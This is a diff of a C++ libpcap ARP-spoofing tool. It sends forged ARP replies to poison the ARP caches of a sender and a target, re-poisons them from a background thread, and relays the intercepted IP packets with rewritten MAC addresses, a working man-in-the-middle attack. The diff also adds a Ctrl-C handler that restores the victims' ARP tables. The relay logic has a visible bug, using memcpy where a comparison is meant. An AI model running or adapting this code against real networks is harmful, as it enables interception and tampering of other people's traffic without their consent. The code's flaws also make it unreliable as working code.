@@ -1,6 +1,8 @@
+#include <signal.h>
 #include <string>
 #include <pthread.h>
 #include <cstdio>
+#include <stdio.h>
 #include <pcap.h>
 #include <sys/ioctl.h>
 #include <net/if.h>
@@ -9,6 +11,7 @@
 #include <string.h>
 #include "ethhdr.h"
 #include "arphdr.h"
+
 using namespace std;
 #define MAC_SIZE 6
 #define TMAC_SIZE 20
@@ -30,6 +33,8 @@ u_int32_t packetsize=0;
 u_int8_t eth_header_len = 14;
 u_int8_t ip_header_len;//4bit
 u_int8_t tcp_header_len;//4bit
+
+void repairHandler(int sig);
 void  resend_spoof_num(int i);
 void  *resend_spoof(void* arg);
 void show_mytable();
@@ -56,21 +61,21 @@ void usage() {
 
 struct Pair{
 	uint32_t ip;
+	u_int8_t ip_a[4];
 	u_int8_t mac[6];
 };
 
 struct Pair *pArr;// 0 - my 1 - target
 
 int main(int argc, char* argv[]) {
-	//printf("argc = %d\n", argc);	
 	if ( argc < 4 | argc % 2 == 1) {//input error
 		usage();
 		return -1;
 	}
-	size = argc / 2 - 1; // number of arp packet
+	size = (argc / 2) - 1; // number of arp packet
 	dev = argv[1];//interface assign
 	char errbuf[PCAP_ERRBUF_SIZE];
-	//printf("\n size = %d\n", size);
+	signal(SIGINT, repairHandler);
 	pArr = (struct Pair*)malloc(sizeof(struct Pair)*size*2);// pair arr
 
 	handle = pcap_open_live(dev,BUFSIZ , 1, 1, errbuf);
@@ -96,17 +101,44 @@ int main(int argc, char* argv[]) {
 		find_mac(argv[i*2+3],target_mac,(i*2)+1);// find target mac
 
 		send_forg_arp(argv[i*2+2],argv[i*2+3]);	
-		printf("\n");
 	}
 //////////////// resend_spoof////////////////////
-	//pthread_t thread_id1;
-	//int thread_id = pthread_create(&thread_id1, NULL, resend_spoof, (void*)0);
+	pthread_t thread_id1;
+	int thread_id = pthread_create(&thread_id1, NULL, resend_spoof, (void*)0);
 	
 	show_mytable();
 	fflush(stdout);
+	printf("\n Control + c = repair sender arp table and exit\n");
 //////////////// find relay packet///////////////
 	send_relay();
 	pcap_close(handle);
+}
+void repairHandler(int sig){
+	for(int i=0; i < size; i++)
+	{
+		EthArpPacket packet;
+
+    	packet.eth_.dmac_ = Mac(pArr[i*2].mac);//Sender Mac
+    	packet.eth_.smac_ = Mac(pArr[i*2+1].mac);//target Mac
+    	packet.eth_.type_ = htons(EthHdr::Arp);
+
+    	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
+    	packet.arp_.pro_ = htons(EthHdr::Ip4);
+    	packet.arp_.hln_ = Mac::SIZE;
+    	packet.arp_.pln_ = Ip::SIZE;
+  		packet.arp_.op_ = htons(ArpHdr::Reply);
+   		packet.arp_.smac_ = Mac(pArr[i*2+1].mac);//target Mac
+   		packet.arp_.sip_ = htonl(Ip(pArr[i*2+1].ip));//target Ip
+  		packet.arp_.tmac_ = Mac(pArr[i*2].mac);//Sender Mac
+ 		packet.arp_.tip_ = htonl(Ip(pArr[i*2].ip));//Sender Ip	
+
+		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
+   		if (res != 0) {
+    			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+    	}
+	}
+	printf("\nrepair complete bye\n");
+	exit(1);
 }
 void  resend_spoof_num(int i){
 	EthArpPacket packet;
@@ -127,8 +159,6 @@ void  resend_spoof_num(int i){
 	if (res != 0) {
 		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
 	}
-	printf("\n send mod arp packet\n");
-	printf("\n thread send arp %d",i);	
 }
 void  *resend_spoof(void* arg){
 	while(1)
@@ -154,14 +184,11 @@ void  *resend_spoof(void* arg){
 			if (res != 0) {
 				fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
 			}
-			printf("\n send mod arp packet\n");
-			printf("\n thread send arp %d",i);	
 		}
 	}
 }
 
 void show_mytable(){
-	printf("\n my ip= ");
 	for(int k=0;k<4;k++)
 	{
 		printf("%u ",m_ip[k]);
@@ -175,14 +202,11 @@ void show_mytable(){
 	for(int i=0;i<size*2;i++)
 	{
 		printf("\n table %d ip = ",i);
-	/*	
 		for(int k=0;k<4;k++)
 		{
-			printf("%u ",pArr[i].ip[k]);
+			printf("%d ",pArr[i].ip_a[k]);
 		}
-	*/
-		printf("%x ",pArr[i].ip);
-		printf("\n table %d mac= ",i);
+		printf("\n table %d mac = ",i);
 		for(int k=0;k<6;k++)
 		{
 			printf("%x ",pArr[i].mac[k]);
@@ -202,45 +226,22 @@ int find_relay_packet(const u_char* packet){
 
 	for(int i=0; i< size; i++)
 	{
-		//printf("what time%d \n",i);
-		//source mac = sender mac & des ip = target ip			
 		if(!(memcmp((pArr[i*2].mac),&packet[6],6)))//find sender mac
-		{/*
-				printf("\n find sender mac = ");
-				for(int k=0; k<6 ; k++)
-				{
-					printf("%2x ",packet[6+k]);
-				}
-				printf("\n find sender ip = ");
-				for(int k=0; k<4 ; k++)
-				{
-					printf("%u ",packet[26+k]);
-				}
-		*/
-			if((memcmp(m_ip,&packet[30],4)) && !memcmp(&packet[12],&type,2))//target check- not my ip but my mac = spoof target + ip packet
+		{
+			if(memcpy(m_ip,&packet[30],4) && !memcmp(&packet[12],&type,2))// ip packet
 			{
-			/*
-				printf("\n type = ");
-				for(int a=0;a<2;a++)
+				int find=1;
+				for(int j = 0;j < size; j++)// target check
 				{
-					printf("%.2x ", packet[12+a]);
+					find = memcmp(pArr[j*2+1].ip_a,&packet[30],4);		
+					if(find ==0){//find target
+						return j*2+1;
+					}
 				}
-				printf("\n i= %d", i*2);
-			*/
-				return i*2 + 1;
+				return i*2+1;// can not find target 
 			}
 			else if( !memcmp(&packet[12],&type_arp,2) && !memcmp(&packet[20],&type_arp_req,2))// find sender mac + arp_req	
 			{
-				printf("\n ---------this packet type = ");
-				for(int a=0;a<2;a++)
-				{
-					printf("%x ",packet[12+a]);
-				}
-				printf("\n ---------this arp type = ");
-				for(int a=0;a<2;a++)
-				{
-					printf("%x ",packet[20+a]);
-				}
 				resend_spoof_num(i);
 				return 0;
 			}
@@ -267,29 +268,8 @@ void send_relay(){
         {
 			t_size -=1;	
 			memcpy((void*)packet,(void*)pArr[t_size+1].mac,6);
-		/*	
-			printf(" \nmod mac = "); 
-			for(int k=0;k < header->len; k++)
-			{
-				//printf("%x ",packet[k]);
-				printf("%x ",packet[k]);
-			}
-		*/
-			//printf("find");	
-            //break;
-       //		printf("\n paket len1 = %d", header->len);
-       	//	printf("\n paket len2 = %d", header->caplen);
-       	//	printf("\n paket len3 = %d", sizeof(EthArpPacket));
-			
+			memcpy((void*)&packet[6],(void*)my_mac,6);
 			res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(packet),(int)header->len);
-			/*
-			printf(" \nsend data = "); 
-			for(int k=0;k < header->len; k++)
-			{
-				printf("%x ",packet[k]);
-			}
-			printf("\n mod packet send");
-			*/
 			if(res !=0){
 				fprintf(stderr,"pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
 		}
@@ -372,7 +352,6 @@ void send_forg_arp(char *sip,char *dip){
 	if (res != 0) {
 		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
 	}
-	printf("\n send mod arp packet\n");
 }
 
 bool find_arp_packet(const u_char* packet,char * mac,char *ip,int num){
@@ -394,9 +373,9 @@ bool find_arp_packet(const u_char* packet,char * mac,char *ip,int num){
 	{	
 		uint8_t arr[4];
 		char temp[48];
-		printf(" \n check = %d", num);
 		memcpy(arr,&packet[28],4);
 		memcpy(&pArr[num].ip,&packet[28],4);
+		memcpy(pArr[num].ip_a,&packet[28],4);
 		pArr[num].ip = ntohl(pArr[num].ip);
 		memcpy(pArr[num].mac,&packet[22],6);
 		sprintf(temp,"%d.%d.%d.%d",arr[0],arr[1],arr[2],arr[3]);
